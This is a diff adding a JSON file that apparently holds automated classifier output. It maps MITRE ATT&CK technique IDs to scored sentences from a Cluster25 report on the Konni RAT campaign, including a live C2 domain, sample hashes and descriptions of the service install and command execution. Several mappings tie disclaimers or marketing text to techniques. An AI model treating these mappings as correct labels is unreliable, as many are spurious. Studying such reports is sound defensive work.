+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3932
+      },
+      {
+        "sentence": "The reader is responsible for determining whether or not to follow any of the suggestions, recommendations or potential mitigations set out in this report, entirely at their own discretion. ---------------------------------------- Conversion note: Status: ok",
+        "score": 0.3085
+      }
+    ],
+    "T1113": [
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.3514
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.4145
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3184
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.4104
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.427
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.3239
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3378
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3742
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3646
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.4311
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.3033
+      }
+    ],
+    "T1119": [
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.3788
+      },
+      {
+        "sentence": "02 INITIAL ACCESS C25 has traced an activity that started at least from August 2021 aimed at Russian targets operating in the diplomatic sector.",
+        "score": 0.3217
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.4161
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.3731
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4553
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.4037
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3113
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.6161
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.4346
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3839
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.4301
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.301
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.5404
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3119
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.3751
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3402
+      },
+      {
+        "sentence": "2022 // © Cluster25 14 Unrestricted // freely shareable content TLP:WHITE Finally, it is possible to notice the use of \"ZETTA HOSTING SOLUTIONS LLC\" ( AS44476 ) as hosting provider and the use of free hosting sites like c1 dot biz and atwebpages dot com for the Command and Controls hostnames.",
+        "score": 0.3462
+      },
+      {
+        "sentence": "Specifically, atwebpages dot com appears to be commonly observable in intrusions relating to threat actors belonging to the Kimsuki umbrella.",
+        "score": 0.3328
+      },
+      {
+        "sentence": "Cluster25 experts are specialized in hunting and collecting cyber threats, analysis, reverse-engineering and adversary hunting practices.",
+        "score": 0.3816
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.3848
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.4682
+      },
+      {
+        "sentence": "The reproduction and distribution of this material is prohibited without express written permission from Cluster25.",
+        "score": 0.3516
+      },
+      {
+        "sentence": "Given the inherent nature of threat intelligence, the content contained in this report is based on information gathered and understood at the time of its creation.",
+        "score": 0.4524
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3571
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.4193
+      }
+    ],
+    "T1134": [
+      {
+        "sentence": "2022 // © Cluster25 4 Unrestricted // freely shareable content TLP:WHITE 01 KILLCHAIN OVERVIEW The following diagram shows the overall phases used by the actor to infect the target.",
+        "score": 0.3478
+      },
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.3608
+      },
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.3656
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.4335
+      },
+      {
+        "sentence": "When executed, it drops under the %TEMP% directory an image named Happy.jpg (which is embedded in the resource section) and opens it as a foreground window to trick the victim into believing that it is a legitimate Russian themed happy holidays screensaver.",
+        "score": 0.322
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3969
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3652
+      },
+      {
+        "sentence": "The following image illustrates the snipped of code described.",
+        "score": 0.31
+      },
+      {
+        "sentence": "The Windows service is installed by configuring svchost.exe as a process container of the DLL executable representing Konni RAT malware.",
+        "score": 0.3715
+      },
+      {
+        "sentence": "Install.bat has already been seen among the TTPs belonging to this threat actor, which content is visible below, where, in this case, it appears to have been slightly modified, and therefore more likely to deceive detection signatures referring to files used in previous intrusions.",
+        "score": 0.3642
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.458
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3684
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.5395
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3231
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.318
+      },
+      {
+        "sentence": "In this case the final implant is a new version of Konni RAT having code and behavioral similarities with its previous versions.",
+        "score": 0.3729
+      },
+      {
+        "sentence": "Identifiable modifications are evident in the pattern used for the initial access phase, most likely put in place to exploit the holiday time of year as bait.",
+        "score": 0.3259
+      },
+      {
+        "sentence": "Cluster25 independently designs and develops technologies aimed at the classification and categorization of malicious artifacts as well as for their correlation with known threat groups.",
+        "score": 0.3248
+      },
+      {
+        "sentence": "Relying on extensive visibility into the digital threat landscape, it overcomes the usual limitations of services based on ex-post threat observation by providing real predictive and proactive intelligence services.",
+        "score": 0.3337
+      },
+      {
+        "sentence": "All rights reserved.",
+        "score": 0.3169
+      },
+      {
+        "sentence": "Traffic Light Protocol (TLP) violation could lead to the immediate cancellation of existing services as well as the initiation of legal actions aimed at protecting the intellectual property and competitive advantage of DuskRise Inc.",
+        "score": 0.3632
+      },
+      {
+        "sentence": "The information in this report is general in nature and does not take into account the specific needs of your IT ecosystem and network, which may vary and require unique action.",
+        "score": 0.3251
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3008
+      }
+    ],
+    "T1569": [
+      {
+        "sentence": "The malicious activity starts from an email containing a malicious zip file, which once decompressed drops a malicious downloader able to activate a complex chain of actions finalized to deploy Konni RAT malware, named scrnsvc.dll , as Windows service.",
+        "score": 0.5777
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.3205
+      },
+      {
+        "sentence": "2022 // © Cluster25 7 Unrestricted // freely shareable content TLP:WHITE After the CAB downloading, the malware starts the file decompression using expand.exe process logging a file named - a.log - when the decompression is finished.",
+        "score": 0.3995
+      },
+      {
+        "sentence": "The Windows service is installed by configuring svchost.exe as a process container of the DLL executable representing Konni RAT malware.",
+        "score": 0.6519
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.4774
+      },
+      {
+        "sentence": "The configuration structure is then passed as argument at a new thread created which is used as main routine by the malware to perform the network communications and exfiltration, as visible in the following code snippet.",
+        "score": 0.3236
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.4582
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3364
+      },
+      {
+        "sentence": "The reported kill-chain shows overlaps with the TTPs already linked to this group as the use of CAB files as infection stage and the use of bat file to automatically install Konni RAT as a service.",
+        "score": 0.5615
+      },
+      {
+        "sentence": "As such, Cluster25 provides the information and content on an “as-is” basis without representation or warranty and accepts no liability for any action or failure to act taken in response to the information contained or referenced in this report.",
+        "score": 0.3009
+      }
+    ],
+    "T1033": [
+      {
+        "sentence": "03 DOWNLOADER ANALYSIS The artifact found and extracted from the zip is a Windows x32 executable, named “поздравление.scr ” and compiled in date Mon Dec 20 09:16:02 2021 .",
+        "score": 0.3097
+      },
+      {
+        "sentence": "From the recent compilation date, it seems to have been developed specifically for the attack under analysis, and it can be identified by the following hash: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 2022 // © Cluster25 6 Unrestricted // freely shareable content TLP:WHITE The sample has the behavior of a trojan malware, and it is intended to resemble the legitimate scrnsave.scr Windows application.",
+        "score": 0.3012
+      },
+      {
+        "sentence": "Subsequently, in the background, the malware starts its malicious activities by downloading the next stage payload from an HTTP GET request to the Command-and-Control domain i758769.atwebpages.com, passing as parameters the hardcoded user id numbered as 18756 and a type used as a flag to specify if the infected machine was 32 or 64 bit.",
+        "score": 0.4376
+      },
+      {
+        "sentence": "Cluster25 retrieved two different samples of the same Konni version identified by the following hashes: SHA256 cdfc101b18b9b3f9e418fbb9a6b7d2750d5918c61ed3899ca4ecd7ede5022ac5 8f7037aaf27bb58a15f946bd3a30cb468078a7ee9addcc4ba89440b2114e4c83 Once registered as a service, the malware starts solving in runtime all the WinAPIs needed to interface with the infected operating system's file system and to communicate with the control and monitoring server.",
+        "score": 0.4481
+      },
+      {
+        "sentence": "The commands received are parsed from the response and, if containing the character ” >” are executed via CreateProcessAsUserW obtaining the Token belonging to svchost.exe process (likely to avoid exceptions during output redirection of the file writing, being the sample located in System32 folder), otherwise using the CreateProcessW function.",
+        "score": 0.3635
+      },
+      {
+        "sentence": "2022 // © Cluster25 13 Unrestricted // freely shareable content TLP:WHITE At the time of the analysis the server was up but it did not provide the commands to be executed, probably because the actor set up the Command and Control backend with some form of geofencing validation.",
+        "score": 0.3311
+      },
+      {
+        "sentence": "05 ATTRIBUTION Cluster25 attributes these intrusion attempts with high degree of confidence to the North Korean group known as Konni.",
+        "score": 0.3616
+      },
+      {
+        "sentence": "Konni is also the name of their custom RAT which presents intelligence gathering features.",
+        "score": 0.3696
+      }
+    ]
+  }
+}
